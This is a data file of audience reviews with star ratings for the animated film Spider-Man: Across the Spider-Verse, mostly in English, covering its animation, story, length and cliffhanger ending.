I've gone to see this movie multiple times in theaters due to how absolutely stunning everything about it is,5
"Fantastic. The visuals and story are some of the best I've seen. While I really enjoyed the first Spider-Verse, I think this was better by a mile.",4.5
OMG!!!! Visual masterpiece full of long awaited characters and loads of Easter eggs. This is a perfect squeal to a to the award winning Into The Spider Verse,4.5
"Great movie, almost as good as the first. If I had a complaint, it would be this trend of not having a complete story contained within the movie, leaving the audience with an empty feeling and the end and the producers with more money be as they know you will want to finish the story.",4

"A good friend said I must have misspelled Batman Returns when telling him that Spider-Man: Across The Spider-Verse is, hands down, the best superhero film ever made. While I adore Batman Returns, this Spider-Man (a misnomer of sorts) film rockets beyond expectations into an unexpectedly stratospheric realm. Across The Spider-Verse is nigh-on flawless. It is a perfect testimony and tribute to the heart of the Spiderman character, epitomised by its two, young leads who champion radical, postitive progress over fear of movement. They are just, loyal witty and, ultimately, heroic in their courageousness to take steps beyond the known in the name of positive, unshackled change. This yarn spins so many webs. The tense, fragile bonds of love - blood and friendship - that sway wildly in the winds of uncertainty, yet ultimately rise with hope and trust. The daggers of buoyant ignorance (from liberal left) that swell the rage of the arrogant, vulnerable outcast (as empathetic a depiction of the right-wing as you can get). The bountiful easter eggs. The joyful plurality of Marvel's wistfully woven past, bombastic present and known/unknown future. The multitude of meta delightfully crafted with so many different tools, textures and timings. This is the ultimate Marvel multiverse picture. Its freedom an absolute joy to behold. It is the unlocking that the strictly live-action films can no longer bring themselves to be - because of the fear so deftly accosted in this very film. In this animation, Marvel is closer to its true core of pages eagerly flipped by those fortunate enough to engage in a medium once mocked and rarely lauded as it is today. Spider-Man: Across The Spider-Verse really is, hands down, the single best superhero film ever made. Quite honestly, it gives any film in 2023 (and beyond) a run for its money. The depth involved in this film is stunningly rendered by a group of people who are clearly together and deeply in love with this project. This film is, slightly ironically, a genuine marvel; an achievement so bright that it has cast its own enormous standard over its next chapter. I would be hasty to say this is the 'Empire Strikes Back' of this triology. Hasty because the best may still be to come. A joy doesn't even begin to summarise it. This is that exquisite piece of cinema you leave with something inside you (re)awoken, fleeting in its intensity, yet warmly settling inside you, thankfully unlikely to depart.",5
Perfect best marvel movie,5
The best animation style ever!!. Is the best superhero in all the world.,5
One of the greatest films ever!,5
Doubled down on what was already one of the best superhero (or otherwise) films of all time to create a certified masterpiece.,5
"One of the greatest movies ever produced! Stunning visuals, beautiful soundtrack and score, phenomenal voice acting, intentional character development, and fantastic storytelling are all on display! Best Spider-Man movie ever!",5

Too much going on all at once and yet the first 1hr just slowly dragged on... There is no way I could sit through that again. One of the people I saw the movie with fell asleep. I liked the characters and some cool plot points but the way the left it was super disappointing. I will probably watch the next one but only at home...,3
"Almost perfect. The only criticisms: Peter shouldn't be taking kids to the Spider-Man store, and Jesse Drew shouldn't be taking younger kids to the Spider-Woman store. Otherwise I have nothing to complain about. Nice animation. Great story. Great voice acting. hilarious comedy. Amazing characters. It is indeed necessary.",4.5

"A very entertaining film with no self-control. The story is great, it doesn't rush through or change pace too often. This film is also more about human feelings and right Vs wrong, instead of plain old superhero fighting that we get these days. I was annoyed that some characters from the last film were pushed aside, however I would probably complain more if it had just been same old, same old. However, Gwen Stacey felt like a replacement for Miles Morales half the time, which was highly annoying. I thought the animation was a bit over the top for most of the film. The previous film found the balance between the experimental look and also the standard 2D animation, but there are barely any normal backdrops in this film, with mostly colourful and psychedelic arrangements replacing them. Very good, can't wait for the next one!",3.5

Nowadays, I'm usually quite lazy and don't have the patience to sit idle and stare at a screen for 2 to 3 hours, but I managed to watch this film in one sitting. When it finished, I thought, 'Bro, just 140 minutes? That's all you've got to show us?' Let's start with the basics. First of all, the animation is beyond words; it's one of the best I've seen. However, what I liked most about this film is its background score. Man, the background score is so, so nice. The way it immersed me in the flow of the film was truly amazing. The casting was also good. Now, let's address some shortcomings. The film can be a bit confusing at times. There are a lot of characters and concepts to keep track of, and the film doesn't always do a good job of explaining them. The film's humor can be hit-or-miss. Some of the jokes land well, but others feel forced or out of place. Overall, this film is a great one-time watch, fast-paced, visually stunning, with an amazing background score. If you enjoy thought-provoking, fast-paced films, you should definitely give it a try.",4
"Throughout my life, rather controversially, I have not been one to love superhero movies. I rather enjoyed the fleeting three Tom Holland Spiderman's, but that is past me. After watching Spiderman: Across the spider verse, my opinion remained unchanged. Owing to all the excitement around it and some critics claiming it to be the best movie of all time, I just had to see it. But to my honest surprise, it was quite underwhelming. Spiderman: Across the Spider Verse is a sequel to Spiderman: Into the Spider Verse, and if you don't see the first one before the second, the movie just, doesn't make any sense, plain and simple. Even after watching the first movie, throughout the entire sequel I was on very shaky ground and was questioning most of the things that happened. In Spiderman: Into the Spider Verse, after reuniting with Gwen Stacy, or, ‚ÄòSpiderwoman 'Brooklyn's full-time, friendly neighbourhood Spider-Man Miles Morales is catapulted across the Multiverse, where he encounters the Spider Society, a team of Spider-People charged with protecting the Multiverse's very existence, and we see some familiar faces, and also some new additions to the Spider world. In my very honest opinion, I will say, that this movie was not very good. Everybody across the world is saying how fantastic this movie is, but I just couldn't get into it. Most of scenes I was lost on what was going on, and even though I followed all of the last movie, I felt like I was really missing something. And I paid my upmost attention to it. My sister is absolutely in love with this movie, and has always been saying how amazing it is, so I took it upon myself to soak up everything this movie had to offer, which was actually not very much. Throughout the entire movie it was incredibly confusing, and I just had to take my best guess at what was going on which only made it more confusing. In my opinion, this movie had more imperfections that most people can shake a stick at. When it came to a point where there were hundreds of spider-people on a building going through time, or something, I was completely lost. But I feel like it wouldn't really make sense to just outright say that one of the most highly regarded movies this century was flat out terrible, and there are some good parts, and trust me, I tried to find as many as I could. The introduction of the new spider people entertained me a great amount, with new faces such as spider punk, aka British punk spiderman, and Indian spiderman. I forget his name. Also in one of the first fight scenes featuring Miles Morales, he has a battle with ‚ÄòThe Spot'. It is extremely funny all through the scene, with snarky remarks on both sides that nearly had me in stitches. But, overall, the movie was not good. It was confusing the whole way through, and cons outnumber the cons ten to one. There are some funny parts, but not enough to make up for it's plot. There people saying that this movie is better than the likes of ‚ÄòThe Godfather' and they could be right. With so many people saying how outstanding that the movie was, I think you should feel inclined to watch it, but, if It was up to me, I wouldn't watch this movie again. Also, the movie very much ends on a cliff hanger, setting up a perfect segue into a third movie, but, To be honest, when comes out I won't feel obliged to watch it.",2.5
"a masterpiece BUT i hate ""to be continued..""",5
"Back at again with Lord and Miller delivering at a timeless masterpiece, probably the best movie (in my opinion) of the 2020s I've seen, the single best Spider-Man movie ever made and I absolutely love the Raimi films (not Spider-Man 3 tho lol but it's still pretty good)",5
"Graphic is superb as always, but the story is what caught me by surprise, really good. Highly recommended, hope the second part will be as good",5
First movie was awesome. This one just felt like it was more concerned with checking social boxes than story telling. We will definitely wait for the follow up to come to streaming.,2.5
Almost a good movie. I really enjoyed the first 2/3rds until the it got close to the ending. Felt like they had a longer movie planned and cut it somewhere random in order to continue the story another time.,3
really great movie a must see film,5
"A glorious dedication to the history of Spiderman - and to the sheer artistic skill of seamlessly combining decades, characters and modern animation styles in a fast-paced but endearing story. Definitely one to watch on the big screen.",5

"Spider-Man across the spider-verse smashed my high expectations following the incredible first film. With the most creative and intriguing animation style I have ever scene and a genuinely heart-wrenching story brought together with the iconic character of Spider-man, what is not to love! The film has endless details and complexities that get unveiled when re watching and the plot actually goes surprisingly deep into moral dilemmas which make for an simultaneously intense and thought provoking experience. Finally, it succeeded in adding a plentiful bunch of new and interesting characters from different backgrounds without it feeling forced or compromising on the story. Overall, An excellent film!",5

beautifully animated with amazing style of the drawings featured in this film looking forward to the next movie in the seiries,5
"""Across the Spider-verse"" is one of, if not the best superhero movie ever. Each Spider-Man has their own theme, own color scene, their own trait that make then unique. They do an amazing job making music fit each scene incredibly well but not make the music the make part. They also have amazing background effects in color and just general amazing design. This movie is made even better by fusing the music, color, and an amazing meaning behind the story together to make an all-time favorite movie that I will never forget, nor will I never not get goosebumps from watching it.",5
"Damn near perfect, characters, story, visuals, everything is awesome, only down side is the some what abrupt ending. But nonetheless a beyond worthy successor to into the spiderverse.",4.5
"mindblowingly fucking amazing. i'm speechless, it's just perfect in every possible way.",5
This is such a great movie,5
Spider-Man: Across The Spider-Verse is the BEST Movie EVER!!,5
"I don't understand why everyone praises this movie above everything else. It's such an average movie, good, but average, nothing sensational. I saw the plot twist at the end of the movie 20 minutes before it occurred and honestly, the movie just dragged out for no real reason. Honestly, in these times of horrid movies, movies like this begin to look amazing but the truth is our standards have fallen.",3
"The word i am going to use to describe this movie is a word you should not use lightly in cinema and the art of cinema as a whole ... A ""Masterpiece""",5
"Solid 9/10! ""Spider-Man: Across the Spider-Verse is an absolute triumph in the world of animated superhero films. As a huge fan of the first Spider-Verse movie, my expectations were sky-high, and I am thrilled to say that this sequel not only met but exceeded them. From start to finish, it was a visually stunning, emotionally resonant, and action-packed adventure that left me on the edge of my seat. One of the standout aspects of this film is its animation style. The combination of traditional hand-drawn animation with cutting-edge CGI creates a unique and vibrant visual experience. The attention to detail is impeccable, with every frame bursting with color and energy. The action sequences are mind-blowing, with the characters leaping off the screen and swinging through the city with incredible fluidity. It truly feels like a comic book come to life. The story takes place after the events of the first film, and it delves deeper into the multiverse concept. Miles Morales, the young Spider-Man, embarks on a journey across different dimensions, encountering various versions of Spider-Man along the way. The narrative is engaging and keeps you hooked from start to finish. It seamlessly blends humor, heart, and high-stakes action, making for a well-rounded and satisfying experience. The voice acting is top-notch, with Shameik Moore reprising his role as Miles Morales. He brings a youthful energy and vulnerability to the character, making him relatable and likable. The supporting cast, including Hailee Steinfeld as Gwen Stacy and Jake Johnson as Peter B. Parker, also deliver fantastic performances, adding depth and humor to their respective roles. What sets this film apart is its ability to tackle complex themes and emotions. It explores the idea of identity, the weight of responsibility, and the importance of family and friendship. These themes are handled with care and resonate on a deep level, making the characters feel more human and relatable. If I had to nitpick, there were a few moments where the pacing felt slightly rushed, and some characters could have been given more screen time. However, these minor flaws do not detract from the overall excellence of the film. In conclusion, Spider-Man: Across the Spider-Verse is a must-watch for any fan of the superhero genre. It is a visually stunning, emotionally resonant, and action-packed adventure that will leave you wanting more. With its incredible animation, engaging story, and memorable characters, it deserves a solid 9 out of 10. I cannot wait to see what the future holds for the Spider-Verse franchise.""",5
"Whilst perhaps not as tight as its predecessor, is transcends its animation and ambition, surpassing all ""middle chapter"" issues.",4.5
"Animation should be the only acceptable medium to make superhero movies, particularly in the breathtaking style of the Spider-Verse movies that ingeniously captures the essence of comic books with its vibrant colors and exquisite textures. Phil Lord and Christopher Miller finally created the perfect Spider-Man adaptation as Across the Spider-Verse is another visually dazzling and emotionally charged film. The story builds upon what was established in the first movie by breaking new heights in terms of being complex but well-crafted. As the characters are more grown up, so are the themes in this sequel which leads to a whole new level of character development. That's not to say it's any less exhilarating, for there are plenty of action-packed sequences. The only bummer is that the film ends with a cliffhanger after a lengthy runtime of nearly two and a half hours.",4.5
"Spider-Man Across The Spider-Verse is another epic and perfected movie which is a sequel to the cultural phenomenon that is Spider-Man Into The Spider-Verse. The movie no doubt has the best animation of any movie to date with very close attention to detail and absolutely impressive and expressive colors. The story expands from the original perfectly by introducing just enough for a sequel without making it too complex or too bloated. The twist and turns are emotional and are strong that tie everything known about Spider-Man all together to by the end make everything make sense. Although the ending of Across The Spider-Verse may be too much for some people to handle, it further proves that the stories relating to Miles Morales are masterclass in writing, character building, emotion, and creativity.",5

"pretty gud. like everyone knows, marvel has better live action, dc has better animation. but you have to respect this one. loved the spiderman with the rubix cube. loved the easter egg reference to no way home. im not dissapointed.",4.5
"Would've given 5 stars but they pulled an attack on titan massive cliffhanger part 2 bs! This animation movie was done with so much passion and it is palpable when you watch it. The visuals, story, script, cast and story all perfect. Most animations nowadays go by the generic plot flow/visuals and it just becomes one of those many duplicates out there but this one is a gem. So much so that I've felt something which I rarely do when I watch something. Call it whatever, inspiration, a push or what uncle Aaron said ""keep going"". A movie with an impact like this aimed at both young and older generations man kudos! Con however is... part 2 might not live up to this. They've given everything hopefully they do better; which it already is, or maintain. In my years of watching almost all the movies or series don't last long. Ehem Game of thrones.",4.5
"The movie was good at 1st but the end was horrible, they left us with no credit scene e and we have too wait a few years till we get the second one. They wasted 2 hours and 20 minutes with talking and yepping",1

With a perfect balance of telling and showing with its unmatched comic like animation, fresh and free flowing dialogue with undertones of humor and seriousness alike (achieving a perfect mix, adding to the story with cinematic aspects amplifying tone), outstanding street and abstract art and coloring along with beautiful cinematic lighting alike and masterful storytelling seamlessly completing the character arc of even the newer characters, hooking viewers deeper and deeper into the story unraveling every level (there's so many levels to this. Not to much. Just right. Oh soo good!) with every scene or sequence of scenes and act along with the totally insane and literally out-of-this-world action sequences and effortlessly engaging sound scape. A total must-see. A masterclass in storytelling and digital animation. Absolutely Brilliant in every way. Huge thanks to the Directors, Producers, Writers, Animators and Sound scape teams and Actors.

"Visually stunning, great score and amazing characters. A overall incredible experience, but I feel will get better when Beyond comes out, because this feels very incomplete, which I know is supposed to be the case, but still.

THE FIRST MOVIE ""Spider-Man: Into the Spider-Verse"" IS ALREADY SO GOOD BUT MAN, THIS MOVIE JUST EXPANDS UPON THAT AND MAKES IT SO EXPANSIVE AND AWESOME TO WATCH! WHOEVER DID THE VOICE CASTING DID A PERFECT JOB! EVERYONE SOUNDS LIKE THEY WERE MADE FOR THE ROLE AND IT WAS SO AWESOME SEEING SO MANY NEW SPIDERMEN AND SPIDERWOMEN!

"Spider-Man: Across the Spider-Verse is a solid film for fans of Spider-Man, especially if they've been following the character for many years. The more casual viewer will still enjoy the wild ride that this movie takes you on, even though they won't get the full effect of everything happening in the story. But it's the visual majesty and creative artistry on screen that will bring everyone together for this second outing for Miles Morales. We'll have to wait a while to see how things come to an end, but what is shown in this film will definitely assure everyone that it'll be worth the wait.",4.5
It pretty good I would recommend it but it leaves you on a cliffhanger,3.5
"The first movie was amazing, so I had high hopes for this one, but it was disappointing. The writing and dialogue were pretty bad, and this one was far more preachy with meta dialogue injected for no reason. I also found Miles's story less appealing this time around, and soured my thoughts on watching the third.",2
"I enjoyed this movie, but was hoping for more after my love for the first one. The animation was absolutely on point again. So unique and fresh, it really is awesome what they're doing. However, for some reason, I didn't enjoy Gwen nearly as much in this movie. The music was VERY lackluster in comparison to the first one. I also didn't enjoy the villain, or his voice actors performance, and didn't buy into him as a threat at all. I also didnt enjoy the ending and found myself saying ""Wait, thats it?' when it was over. I fully understand its a part one of a story, but it should've ended better. I liked it, I just expected to love it, so I was a little disappointed. However, I love Spider-man, and cant wait to see the story wrapped up in Beyond the Spider-verse! Overall, I gave this movie a 77.8/100. Go see for yourself!",4
"It was too long, especially for not being a complete movie.",3
"People should learn how to do proper movies, this is a freaking work of art. Just like Arcane, this is beyond a movie.. this is a masterpiece.. I really hope they carry on to create more epic movies like this. In a year with such let downs, Flash, Secret Invasion, this is a breathe of fresh air.",5
Meg 2 better than this goofy movie,0.5
"Spider-Man: Across The Spider-Verse is a masterpiece. It's one of the most impressive films I've seen in a long time. I wasn't as huge a fan of the first one. But this one surpasses it in every conceivable way. It's frantic tone, is justified by its narrative this time round. It's not an exaggeration, it has the best animation I've ever seen. And it features a powerful, zany, and fun Spider-Man story. The film just oozes style, but not at the sake of its substance, but rather in service of it.",5
"suitable for family time, the animation is so fascinating",5
"Sometimes, people connect deeply with certain forms of media, such as movies, songs, or games. For me, this was true when I watched Spider-Man: Into the Spider-Verse. As someone with unresolved family issues who often feels isolated, I found myself relating to many of the movie's main themes. However, even aside from that personal connection, I found the film to be incredibly well-made. The studio and crew clearly put in a lot of effort to ensure that every aspect of the movie was perfectly composed, from the story to the art to the plot itself. It would be unfair to single out any one part of the movie for praise, as everything was simply wonderful.",5

At first i was like when is this thing going to start but by the end i was blown away. I keep not being sure if i like this style but i have been pumped by the end of both movies.,5
More like Spider-Man across the cultural races,3
its very nice movie~goood!!,5
Amazing movie. Such a good cliff-hanger. My favourite animated movie of all time. 9.1/10,4.5
I saw the original movie in theaters when it came out. That original movie was my favorite of all time for a while. I thought nothing could top it. But this did. It was perfect in every way and such a compelling story.,5
"Being over 2 hours long was not disappointing. The dialogue, animation, and character development of new characters was very intriguing. Oscar Isaac did a great job as Spiderman 2099 and I look forward to the story to come in the future for the spiderverse.",5
This movie was amazing to watch in theaters. Only downside is having to wait to finish the story.,4.5
Just as good as the last with vibrant animation a truly original concept when it comes to the story although the immense cliff hanger is hard to judge this as a standalone movie but more of a part 1.,5
brings the same great graphic technique to the film. the story has naturally evolved and still mixed with humour and personal conflict,4
"The runtime is long, but you never feel it because of the incredible action and captivating character dynamics. An epic and easily comprehensible plot, sneaky humor, fantastic acting, and groundbreaking animation all combine to make this picture a worthy continuation of the equally great first movie.",5
Great graphics but confusing storyline and characters. enough with the multi-verse stuff Marvel & DC. Come up with creative stories or just stick to the actual comic storylines.,2
"I really loved the movie, it was very fun and the animation was beautiful.",5
"It was hella fun! I don't know if I need to see again, but wouldn't mind.",4
This is the best Spider Man movie I've ever watched.,5
"Amazing movie! The story continues the first movie that already was great! The overal story is greatly done, and all the little subtle details.. As a Marvel/Spider-man fan I love how much care and time (details) they've put in this movie!",5
Omg what a movie the animation was spectacular as always and the characters had so much depth and development I am so excited to see how they compete with part 2,4.5
I liked it. Fun times,4.5
Nice to watch the movie. I am really enjoy it.,5
keeps getting better,5
"The movie was outstanding. Animation on point, story was amazing, and characters were absolutely amazing.",5
"Amazing! The art and writing is so amazing, can't wait for the trilogy of the movie!",5
"Absoluto amazing the story, the trame, the people was need watch this movie",5
This is a great movie I definitely recommend it this is my second favorite animated movie,3.5
"Absolute perfection based on visuals, story telling, acting, humor, and tension. What else could you possibly want?",5
The spider verse films continue to be better than most marvel and superhero films.,4
The greatest animation you will ever see with characters you actually care about! While the ending may leave a bit to be desired it's only a setup to the following film.,4
"Across the Spider-Verse is a rare gem in cinema, the emotional response of the audience to the revelations, pay-offs & ending was palpable. Watch the original ""Into the Spider-Verse"", then dive into this one.",4.5
The movie was fun and exciting the whole time. Very excited for whats next!,5
great movie. the plot is a bit messy but overall i enjoyed the movie i understood miles because am spiderman too,4
"After about a decade and half of not feeling anything, this movie finally made me feel real emotions. Incredible movie. 10/10, wonder how Beyond the Spiderverse will top this.",5
Nice movie. Very enjoy this movie,5
I like the overall graphical animation and storyline of the movie.,5
Cured my months long art block 10/10,5
Best Anime movie ever! Cool multiverse!,5
Everything about the movie met my every expectation. A must see. Can't wait to see part 2.,5
"Wow I am really blown away. Everything you liked about the first one they up it to 100. You like the spider people? Here's 1,000 more of them. You like the coming of age, reliability and comedy? Here's a whole lot more of it. You like the animation? Where's going to make you blind. The animation is, in my opinion, the most detailed I've ever seen and in the last one where they take it straight out of a comic book this one took the animation straight out of multiple comics. At some points I did just want to pause the screen and study everything going on because even for a 2h and 15m movie, there wasn't too much time to breathe. Beyond all the fancy action and animation at the core of it you find that there are actually characters and relationships that you care about. This movie made Gwen my favourite character she was already cool and voiced by Hailee Steinfeld but right from the opening scene they really developed her character a lot more. This is very clearly a part one of two so this didn't tell a full story and the other spider sidekicks aren't as memorable as the previous movie, so I would say this is weaker than the first but still an amazing experience to see in the movies.",4.5
One of the best movies!!,5
great. just gotta wait for a couple years for beyond the spider-verse,5
SUPER GOOD! I really recommend you see this when you can. It keeps you o. The edge of your seats and gives you a good feeling. It has emotions unlike an other cartoon. Go see it!,5
The Best ultimate Spider Man Movie ever made,5
"I really loved this movie, but I was a little disappointed we didn't get to see what happened to Miles. This movie was great but felt drawn out, they could have shortened it by a lot, if they had just summed up the movie. But honestly, I wasn't really mad, I'm okay with waiting for an incredible movie to come out.",4
"This is quite literally my favourite movie, I cannot say 1 bad word about this movie. Characters were handled great both from a directing standpoint and acting standpoint. The animation is so unique and amazing, I cannot describe it in words",5
By far my most favorite movie of 2023.,5
No words! Just go see if you haven't,5
This is a great movie I loved it I think it's better than the first one,5
I watched this with my friends and LOVED IT as a pre teen this movie was relatable at times and really funny I love the artstyle and the plot! The characters were my favourite part along with the jokes,5
It so greatÔºÅI think I will watch it with my family againÔºÅ,5
Very nicely and powerful movie.hope have the continue,5
"Supass if not equal to the original. Visual/animation are beautiful as always and the story of Miles is so fasinating, I'm so hype for the sequel.",5
"Animation Perfection. There's no other animation like it. If you thought ""Into the Spider-Verse"" had fantastic animation you haven't seen anything yet. One of the greatest animated films and regular films of all time",5
"This was the best Spider-man movie I've ever seen. Everything worked - the plot, the pace, the set-pieces. I didn't even mind that it was a cliffhanger ending. From the openign sequence with Gwen, to the Spider-man India scenes, to the final chase sequence, this film rocked from start to finish. The animation was superior to anything I've ever seen in a western film. If you love animation, if you love Spider-man, if you love movies, you will enjoy this film.",5
"Poor effort, more character change nonsense meh",0.5
"O filme tem boas piadas e fan-services alem de um plot twist muito bom mas tem certas ""dramatiza"" que podem ou te fazer se apaixonar ou se irritar com o filme al√©m da falta de a√ß√£o e falta de um final descente",3.5
"an Astonishingly, Ultimate, Sensational, Fantastic, Amazing and truly Spectacular Spidey experience! TA truly Superior experience.",5
i can watch this 5 more times,5
its good but its gets a bit dark and i hate it ends on a cliffhanger but its really good cant wait for beyond the spiderverse,3.5
"I absolutely loved it! It gives a sense of art, creation and the creativity these artists, animators and it catches our attention really well! It's a must see for me, as it absolutely crushed my highly watch series",5
"The second Spider-Man doesn't disappoint. Love the themes of family obligation and destiny. Miguel is not hot, however the movie still raises the temperature. This is emotion done right.",5
"perfect spider-man movie, you can really tell they spent a lot of time on the movie and the hardwork and effort really shows",5
"The movie was great, the movie was like a mood ring for Gwen, the transgender flag colors repeatedly being shown in the background along with the protect trans kids poster in the back of Gwen's room made this movie a bit more enjoyable because it shows that trans lives matter as well.",5
Fun!!!!!!!!!!!!!!!!!!!!!!,5
"One of the most, if not the most visually stunning and inspired superhero films I've ever seen. A bit rough at the end with the pacing and movement of the film, but a great watch overall.",4.5
"Surprisingly good for an animated Marvel franchise movie. Nice story, enough action to not get bogged down with ""woke"" speeches, and left enough room for sequels to have unique storylines.",3.5
"The style, story, characters and music everything was an amazing cinema experience watchig this. Loved how the movie shifted in the second half connecring miles story from the first film and the spider that bit him. Film ended in a great spot like lord of the rings with me wanting to see what is next.",4.5
Greatest movie of all time,5
"I didn't think this movie could top the first movie, but my GOD, it did. I was so invested in the characters, the story, the visuals, I didn't care long it was. It left me wanting more. What I love about Spider-Man as a whole is he's always involving in everyway, which is way he's always the top superhero.",5
"Im not a big movie person, but this had me hooked from start to finish. An absolute stunning film in both story and animation. A must see for everyone who likes animation",5
Marvel fans can't miss out on this: it is excellent,5
"It was a great movie! Intresting background, great music, fantastic action and can I just point out that I love the main villain? Awesome plot, brilliant comedy and more! Highly recommended",4.5
Nice movie....Worth to watch,5
Amazing.. Is a interesting nice movie to watch!,5
A cinematic masterpiece.,5
"The best movie in history. The characters, message, music, animations, voices, it's heaven itself. This movie changes lives.",5
I‚Äôm the first part was all crazy then it starred to get better,3.5
First part ok to drawn out,2.5
"Not really fan of animated movies but this movie is an exception. I wanted to watch a movie with my two boys so I asked my colleagues if this movie worth it to watch in theaters or wait for streaming? They said gotta watch in theater! They were right!, I wasn't disappointed. I have one regret, should have watch it on IMAX or LUX!!! Definitely watching next with more immersed experience.",5
This movie was great and it had a beautiful story and great villains! 11/10,5
Amazing animation was beautiful,5
It's a shame I can't give more than 5 stars.,5
"This movie is gorgeous in story, music, and animation. The story and character complexity was extraordinary and helps show depth in an age appropriate way. The teen spider are acting like teens in a complex and authentic way. This was one of a few movies I was upset it had ended. I am awaiting the next one!",5
Unbreathable animation!,5
"Impeccable soundtrack, incredible animation and with all the emotions that the film brings, made it the best spider-man movie!!!",5
"Miles Morales, the coolest animated Spider-Man, is back. The unique Spider-Verse animation still blows me away with its numerous different styles in a single frame, crazy colors, and equally crazy visual effects. Voice acting, character building, sound track, story line: all good to great. BUT: if you cannot tell a story in 140 minutes, you might want to cut some filler material (which is definitely there) instead of making it a two-part film, leaving viewers with a major cliff hanger! Come on, this is no tv-show where we have to wait a week for the sequel to go 'Beyond'! Not cool! A few days later, after a re-watch: What a fun movie to watch! The variety of animation styles, combined with live action and Lego bits, is mind blowing. Don't expect to relax while watching it, this film is intense! The different approaches to the various Spider-People, their movements, their way of speaking: priceless! Convincing voice acting as well, both by well-known and not so well-known actors. If there just wasn't the non-ending... Anyway, catch this one in the theater! It is definitely made for the biggest screen you can find! Recommended.",5
This directir definitely deserves another Oscar for this creation. A sequel that is just as outstanding as its original.,5
"Absolute Must See. that's all I need to say, but this movies art direction exceeds the extremely high standard of its predecessor Spiderman Into the Spider-verse. the narrative is incredibly well-written and thought out to clearly be a trilogy and it has the potential to become the best marvel animated trilogy. and dare I say it, it could be one of the best movies I've ever seen",5
"This is the best animated comicbook movie I've ever seen & one of the best comicbook movies ""period"" I've ever seen. Pure epicness!!!",5
twas beautiful too beautiful,5
Wow. This movie is AWESOME! It's way better than into the spiderverse and is definitely one of the top 3 spiderman movies of all time.,4.5
I loved this more than the first !,5
"This movie is absolutely an artistic, metaphorical and an emotional masterpiece combined with stunning animations,voice acting and ofcourse the soundtracks. Metro album played a very crucial role to uplift the cinematic experience. You know that a movie is good when the only complain is it ends soon. The hype for Beyond the spiderverse is incredibly set thus leaving the audiences with many questions and how Miles is going to write his own story and proving the significance and value of the mask of spiderman. If BTSV sticks to it's landing then we will be getting one of the best trilogies ever written.",5
Incredible‚Ä¶ Very well built.,5
This was a fun romp and a worthy successor to the first one. The isolation Miles feels is compounded as the story progresses and builds to a truly epic chase. It's a fun ride and welcome break from the usual Marvel heavy handed preachiness.,4
"Visualmente una joya, pero me pareci√≥ redundante que vi√©ramos a Miles nuevamente tener ""problemas"" con ser spiderman y lo que eso conlleva. Fuera de eso una maravillosa pel√≠cula. Con un gran final.",3.5
"The cameos were amazing, the different animation styles, and Miguel O'Hara was fantastic, he looks so menacing. Miles was great, feeling that he needs to save everyone since he is Spider-Man but he can't because it would mess up the multiverse, because everyone needs to lose someone very close to them. Whoever thought of canon events are amazing, and The Spot was a fantastic villain. You must see it to believe it.",5
No the greatest spider man movie. It was ok.,2
great animation and story,4
Starts slow but picks up I mean picks up and end with a banger 9 out of 10,4.5
its been 5 years since miles' first movie came out so now the whole spider people are back even the citizens,5
Just pure awesomeness. Great details and good story. Can't wait for the next part.,4.5
It is a great Spiderman movie.,4
Just all around amazing,5
This movie is creative and recommend to all age watch. Nice movieüëç,5
"bardzo fajny film - jedynym problemem jest to, ≈ºe siƒô ko≈Ñczy w najciekawszym momencie i trzeba bƒôdzie trochƒô poczekaƒá na drugƒÖ po≈Çowƒô",4.5
This was definitely one of the best Marvel movies ever! It was visually pleasing and had lots of fun action sences. Alot of people were hating on the cliffhanger but it just got me even more pumped up for the third one,5
I loved Siderman Across the spiderverse! Best MARVEL movie ever. Cannot recommend enough!!,5
I love when spider man said it was spidying time and spidered all over the place,5
"Too long for it to end with ""to be continued."" There was a section in the middle where there were two long conversational scenes; my son zoned out during the first one and I zoned out during the second. Animation, music, and overall story were good.",2.5
Probably one of the worst movies I've ever seen. And interminably long. Sheer torture.,1
"This movie rocked, it really surprised me. First time in a long time I felt like I watched something really original and that I didn't know what was going to come next. The villain is great too, feel a lot of sympathy for him while he also provides comic relief, amazing character development.",5
"The sequel to into the spider-Verse presents the epic action of Miles & Gwen, the visuals are also good, presenting different animation in different universes and there are many other universes in this movie. But what makes this film lacking in my opinion is the fast storytelling, so it will be a little difficult to digest the new problems that arise from time to time.",3.5
Overrated. I think a lot of people rate it high just because it is annimated,2.5
"Absolute best ""SUPER HERO"" movie I have ever seen. Miles morales is the FUTURE!!!!",5
"It wasn't as good as the first one, and came across as a little too preachy. The story could have been written a lot better.",1.5
Best movie of the year.,5
"Just an incredible movie all around. The voice acting, animation, script, it‚Äôs all amazing.",5
Everything about this movie was so good form the acting to the animation to the storyline.,5
Just incredible. Absolute must see even if you're not that much into spider man like me.,5
"This movie swings with mind-blowing explosions of color and style, pushing the boundaries of imagination, and the film's many animation methods transform each frame into a work of art.",5
what in the mind-fuckery did i just witness,5
It was quite the experience That cliffhanger though lol,4
"I liked it, but really don't like when a movie is ""to be continued"". I like series movies where each movie can stand alone, but still have a continuing storyline. The first one was like that. The 2nd one leaves you hanging too much.",3.5
"SPIDER-MAN: ACROSS THE SPIDER-VERSE reaches, and occasionally surpasses, the bar set by its game-changing prequel, SPIDER-MAN: INTO THE SPIDER-VERSE, as well as other multiverse masterpieces such as THE LEGO MOVIE and EVERYTHING EVERYWHERE ALL AT ONCE. It delivers an emotionally impactful story that captures the real, personal frustrations and rigors of capitalism, nuclear families, policing and race in the 21st Century, and boasts beautiful animation, emotionally-engaging set pieces, and daring creativity that will make even the biggest Spider-Man novice smile with delight. The characters characters are complicated and engaging, lovable and understandable even as their actions are designed to enrage and cause heartbreak. The film is also incredibly subversive thematically, even by the standards of its sub-genre, as it seeks to upend the traditional notions of heroism, tragedy, and superhero cinema. The superhero genre is often defined by jingoistic conformism, so the progressive politics of ACROSS THE SPIDER-VERSE feel fresh and compassionate. There are times when the messaging feels heavy-handed (one running gag lands poorly and clashes with the otherwise brilliant messaging), but overall it succeeds on a level unseen in most big blockbusters. The emotional critique of policing and authoritarianism is certainly welcome, as is the exploration of the burdens of being a member of a racial minority group. These ideas ground the story and its characters and prevent it from spiraling into the trap of individualistic high-handedness that some superhero movies have fallen into. It's cliffhanger ending will polarize audiences, but one must fathom the scale of creating such a project this big on its own, and understand that the many hundreds of workers who helped create this film need more time to properly complete this terrific story in its true form, especially in the wake of the strike by writers and actors, and can only achieve the same result in safe, fair working conditions. As responsible audience members, we should support them, because stories like this are produced by talent that is nurtured by empathy and understanding - the same ideals driving the journey of Miles Morales and his friends in the SPIDER-VERSE SAGA.",5
This movie was great. Had a great story and even better visuals,4
